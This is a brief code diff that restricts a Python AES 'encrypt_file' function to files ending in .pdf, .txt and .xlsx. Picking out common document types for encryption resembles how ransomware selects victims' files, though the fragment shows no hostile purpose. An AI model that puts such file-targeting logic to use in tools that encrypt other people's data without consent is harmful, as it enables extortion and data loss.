@@ -9,6 +9,10 @@ def encrypt_file(file_path, key):
     try:
         cipher = AES.new(key, AES.MODE_CBC)
 
+        file_extension = os.path.splitext(file_path)[1].lower()
+        if file_extension not in ['.pdf', '.txt', '.xlsx']:
+            return  
+
         with open(file_path, "rb") as f:
             data = f.read()
 
